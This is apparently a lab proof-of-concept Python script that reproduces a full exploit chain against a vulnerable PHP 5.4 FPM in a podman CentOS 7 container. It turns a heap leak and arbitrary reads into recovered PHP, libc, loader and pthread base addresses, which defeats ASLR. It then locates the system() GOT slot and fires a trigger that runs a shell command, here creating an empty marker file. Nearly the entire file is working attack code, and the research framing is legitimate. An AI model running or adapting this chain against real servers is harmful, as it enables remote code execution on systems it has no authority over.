#!/usr/bin/env python3
"""Reproduce heap leak -> arbitrary read -> ASLR rebase -> RCE via local FPM.

Address resolution in this module uses only exploit responses plus the pinned
static profile.  It never reads /proc/<pid>/maps or /proc/<pid>/mem.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import secrets
import subprocess
import time
from pathlib import Path

from lab.centos7.lab_runtime import build_id, sha256_in_container, top_processes
from poc.build_payload import build_exec, build_heap_leak, build_read

HERE = Path(__file__).resolve().parent
PROFILE_PATH = HERE / "rebase_profile.json"
APP_PATH = "/opt/php54-uaf/rebase_app.php"
CLIENT_PATH = "/opt/php54-uaf/fcgi_client.py"
FPM_CONFIG = "/opt/php54-uaf/fpm-rebase.conf"
CELL_RE = re.compile(rb"CELL_BEGIN\r?\n([^\r\n]*)\r?\nCELL_END")


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def atomic_json(path: Path, value: object) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def parse_qword(data: bytes, label: str) -> int:
    if len(data) != 8:
        raise RuntimeError(f"{label}: expected 8 bytes, received {len(data)}")
    return int.from_bytes(data, "little")


def derive_php_base(heap_data: bytes, anchor_offset: int) -> tuple[int, list[dict[str, str]]]:
    """Find exact `_zval_ptr_dtor` pointers in an exploit-read heap window."""
    hits: list[dict[str, str]] = []
    bases: set[int] = set()
    for offset in range(0, len(heap_data) - 7, 8):
        pointer = int.from_bytes(heap_data[offset : offset + 8], "little")
        if not 0x0000550000000000 <= pointer <= 0x000057FFFFFFFFFF:
            continue
        if pointer < anchor_offset:
            continue
        base = pointer - anchor_offset
        if base & 0xFFF:
            continue
        bases.add(base)
        hits.append({"heap_offset": hex(offset), "pointer": hex(pointer), "candidate_base": hex(base)})
    if len(bases) != 1:
        raise RuntimeError(f"PHP anchor did not produce one PIE base: {sorted(hex(x) for x in bases)}")
    return next(iter(bases)), hits


class LocalFpmTransport:
    def __init__(self, container: str, run_dir: Path):
        self.container = container
        self.run_dir = run_dir
        self.sequence = 0
        self.reads: list[dict[str, object]] = []

    def request(self, label: str, payload: bytes, *, expect_cell: bool = True) -> tuple[bytes | None, dict[str, object]]:
        self.sequence += 1
        filename = f"chain-{self.sequence:02d}.bin"
        host_path = self.run_dir / filename
        host_path.write_bytes(payload)
        started = time.perf_counter()
        result = subprocess.run(
            [
                "podman",
                "exec",
                self.container,
                "python",
                CLIENT_PATH,
                "127.0.0.1",
                "9001",
                APP_PATH,
                "/x/" + filename,
                "--timeout",
                "8",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=15,
            check=False,
        )
        elapsed = round(time.perf_counter() - started, 3)
        record: dict[str, object] = {
            "index": self.sequence,
            "label": label,
            "payload_bytes": len(payload),
            "payload_sha256": digest(payload),
            "client_returncode": result.returncode,
            "response_bytes": len(result.stdout),
            "response_sha256": digest(result.stdout),
            "stderr": result.stderr.decode("utf-8", "replace"),
            "elapsed_seconds": elapsed,
        }
        cell: bytes | None = None
        if expect_cell:
            if result.returncode != 0:
                raise RuntimeError(f"{label}: FastCGI client returned {result.returncode}: {record['stderr']}")
            match = CELL_RE.search(result.stdout)
            if not match:
                raise RuntimeError(f"{label}: framed response cell absent")
            encoded = match.group(1)
            if not encoded or len(encoded) % 2 or re.search(rb"[^0-9a-f]", encoded):
                raise RuntimeError(f"{label}: response cell is not lowercase hexadecimal")
            cell = bytes.fromhex(encoded.decode("ascii"))
            record.update({"cell_bytes": len(cell), "cell_sha256": digest(cell)})
            if len(cell) <= 32:
                record["cell_hex"] = cell.hex()
        self.reads.append(record)
        return cell, record

    def heap_leak(self) -> tuple[int, dict[str, object]]:
        payload = build_heap_leak()
        self.sequence += 1
        filename = f"chain-{self.sequence:02d}.bin"
        (self.run_dir / filename).write_bytes(payload)
        started = time.perf_counter()
        result = subprocess.run(
            [
                "podman", "exec", self.container, "python", CLIENT_PATH,
                "127.0.0.1", "9001", APP_PATH, "/x/" + filename, "--timeout", "8",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=15,
            check=False,
        )
        match = CELL_RE.search(result.stdout)
        if result.returncode != 0 or not match or not re.fullmatch(rb"[0-9]{10,20}", match.group(1)):
            raise RuntimeError("heap leak did not return one decimal pointer")
        pointer = int(match.group(1))
        if not 0x0000550000000000 <= pointer <= 0x00007FFFFFFFFFFF:
            raise RuntimeError(f"heap leak returned an implausible pointer: {pointer:#x}")
        record: dict[str, object] = {
            "index": self.sequence,
            "label": "heap-leak",
            "payload_bytes": len(payload),
            "payload_sha256": digest(payload),
            "client_returncode": result.returncode,
            "response_bytes": len(result.stdout),
            "response_sha256": digest(result.stdout),
            "stderr": result.stderr.decode("utf-8", "replace"),
            "elapsed_seconds": round(time.perf_counter() - started, 3),
            "pointer": hex(pointer),
        }
        self.reads.append(record)
        return pointer, record

    def read(self, label: str, address: int, length: int) -> bytes:
        cell, record = self.request(label, build_read(address, length))
        assert cell is not None
        if len(cell) != length:
            raise RuntimeError(f"{label}: expected {length} bytes, received {len(cell)}")
        record.update({"address": hex(address), "length": length})
        return cell


def rebase_workers(container: str) -> list[int]:
    return sorted(p.host_pid for p in top_processes(container) if "php-fpm: pool rebase" in p.args)


def wait_for_worker_count(container: str, count: int, timeout: float = 10.0) -> list[int]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        workers = rebase_workers(container)
        if len(workers) == count:
            return workers
        time.sleep(0.1)
    raise RuntimeError(f"timed out waiting for {count} rebase worker(s)")


def verify_static_profile(container: str, profile: dict[str, object]) -> dict[str, dict[str, object]]:
    verified: dict[str, dict[str, object]] = {}
    for component in ("php", "libc", "loader", "pthread"):
        item = profile[component]
        assert isinstance(item, dict)
        path = str(item["path"])
        observed_hash = sha256_in_container(container, path)
        observed_build = build_id(container, path)
        if observed_hash != item["sha256"] or observed_build != item["build_id"]:
            raise RuntimeError(f"{component}: pinned static binary fingerprint mismatch")
        verified[component] = {"path": path, "sha256": observed_hash, "build_id": observed_build}
    return verified


def run_case(container: str, run_dir: Path, artifact_dir: Path | None = None) -> dict[str, object]:
    profile = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
    static_files = verify_static_profile(container, profile)
    subprocess.run(
        ["podman", "exec", "-d", container, "/usr/sbin/php-fpm", "-y", FPM_CONFIG, "-F", "-R"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=10,
    )
    workers_initial = wait_for_worker_count(container, 1)
    transport = LocalFpmTransport(container, run_dir)

    heap_pointer, _ = transport.heap_leak()
    heap_window = transport.read("heap-window", heap_pointer, 4096)

    php = profile["php"]
    libc = profile["libc"]
    loader = profile["loader"]
    pthread = profile["pthread"]
    assert isinstance(php, dict) and isinstance(libc, dict) and isinstance(loader, dict) and isinstance(pthread, dict)

    php_base, anchor_hits = derive_php_base(heap_window, int(str(php["zval_ptr_dtor_offset"]), 0))
    if transport.read("php-elf", php_base, 4) != b"\x7fELF":
        raise RuntimeError("derived PHP base does not contain ELF magic")
    php_build = transport.read("php-build-id", php_base + int(str(php["build_id_offset"]), 0), 20)
    if php_build.hex() != php["build_id"]:
        raise RuntimeError("PHP Build ID mismatch")

    iconv_pointer = parse_qword(
        transport.read("php-iconv-got", php_base + int(str(php["iconv_got_offset"]), 0), 8),
        "iconv GOT",
    )
    libc_base = iconv_pointer - int(str(libc["iconv_symbol_offset"]), 0)
    if libc_base & 0xFFF:
        raise RuntimeError("derived libc base is not page aligned")
    if transport.read("libc-elf", libc_base, 4) != b"\x7fELF":
        raise RuntimeError("derived libc base does not contain ELF magic")
    libc_build = transport.read("libc-build-id", libc_base + int(str(libc["build_id_offset"]), 0), 20)
    if libc_build.hex() != libc["build_id"]:
        raise RuntimeError("libc Build ID mismatch")

    r_debug = parse_qword(
        transport.read("php-dt-debug", php_base + int(str(php["dt_debug_offset"]), 0), 8),
        "DT_DEBUG",
    )
    loader_base = r_debug - int(str(loader["r_debug_offset"]), 0)
    if loader_base & 0xFFF:
        raise RuntimeError("derived loader base is not page aligned")
    if transport.read("loader-elf", loader_base, 4) != b"\x7fELF":
        raise RuntimeError("derived loader base does not contain ELF magic")
    loader_build = transport.read("loader-build-id", loader_base + int(str(loader["build_id_offset"]), 0), 20)
    if loader_build.hex() != loader["build_id"]:
        raise RuntimeError("loader Build ID mismatch")

    rtld_global = loader_base + int(str(loader["rtld_global_offset"]), 0)
    pthread_pointer = parse_qword(
        transport.read("rtld-pthread-pointer", rtld_global + int(str(loader["pthread_pointer_slot"]), 0), 8),
        "_rtld_global pthread pointer",
    )
    pthread_base = pthread_pointer - int(str(pthread["mutex_lock_symbol_offset"]), 0)
    if pthread_base & 0xFFF:
        raise RuntimeError("derived pthread base is not page aligned")
    if transport.read("pthread-elf", pthread_base, 4) != b"\x7fELF":
        raise RuntimeError("derived pthread base does not contain ELF magic")
    pthread_build = transport.read(
        "pthread-build-id", pthread_base + int(str(pthread["build_id_offset"]), 0), 20
    )
    if pthread_build.hex() != pthread["build_id"]:
        raise RuntimeError("pthread Build ID mismatch")

    system_slot = pthread_base + int(str(pthread["system_got_offset"]), 0)
    system_target = parse_qword(transport.read("pthread-system-got", system_slot, 8), "system GOT")
    expected_system = libc_base + int(str(libc["system_symbol_offset"]), 0)
    if system_target != expected_system:
        raise RuntimeError("libpthread system GOT does not match derived libc system")

    marker_name = secrets.token_hex(2)[:3]
    marker_path = run_dir / marker_name
    command = (">/x/" + marker_name).encode("ascii")
    if marker_path.exists():
        raise RuntimeError("random marker unexpectedly exists before trigger")
    trigger = build_exec(command, pthread_base, int(str(pthread["system_got_offset"]), 0))
    workers_before = rebase_workers(container)
    _, trigger_record = transport.request("rce-trigger", trigger, expect_cell=False)
    time.sleep(0.35)
    workers_after = wait_for_worker_count(container, 1)
    workers_exited = sorted(set(workers_before) - set(workers_after))
    replacement_workers = sorted(set(workers_after) - set(workers_before))
    marker_created = marker_path.exists() and marker_path.stat().st_size == 0

    result: dict[str, object] = {
        "case": "aslr-rce",
        "address_source": "heap leak and arbitrary-read responses only",
        "proc_maps_used": False,
        "proc_mem_used": False,
        "static_files": static_files,
        "heap_pointer": hex(heap_pointer),
        "heap_window_bytes": len(heap_window),
        "heap_window_sha256": digest(heap_window),
        "php_anchor_hits": anchor_hits,
        "php_base": hex(php_base),
        "iconv_pointer": hex(iconv_pointer),
        "libc_base": hex(libc_base),
        "r_debug": hex(r_debug),
        "loader_base": hex(loader_base),
        "rtld_global": hex(rtld_global),
        "pthread_pointer": hex(pthread_pointer),
        "pthread_base": hex(pthread_base),
        "system_slot": hex(system_slot),
        "system_slot_target": hex(system_target),
        "expected_system": hex(expected_system),
        "requests_before_trigger": trigger_record["index"] - 1,
        "total_requests": len(transport.reads),
        "trigger_payload_bytes": len(trigger),
        "trigger_payload_sha256": digest(trigger),
        "trigger_client_returncode": trigger_record["client_returncode"],
        "trigger_client_stderr": trigger_record["stderr"],
        "workers_initial": workers_initial,
        "workers_before_trigger": workers_before,
        "workers_after_trigger": workers_after,
        "workers_exited": workers_exited,
        "replacement_workers": replacement_workers,
        "marker_created": marker_created,
        "marker": {"path": marker_name, "size": 0} if marker_created else None,
        "reads": transport.reads,
        "success": bool(marker_created and workers_exited and replacement_workers),
    }

    if artifact_dir is not None:
        artifact_dir.mkdir(parents=True, exist_ok=True)
        (artifact_dir / "heap-leak.bin").write_bytes(build_heap_leak())
        (artifact_dir / "trigger.bin").write_bytes(trigger)
        atomic_json(artifact_dir / "trace.json", transport.reads)
        atomic_json(artifact_dir / "result.json", result)
    return result
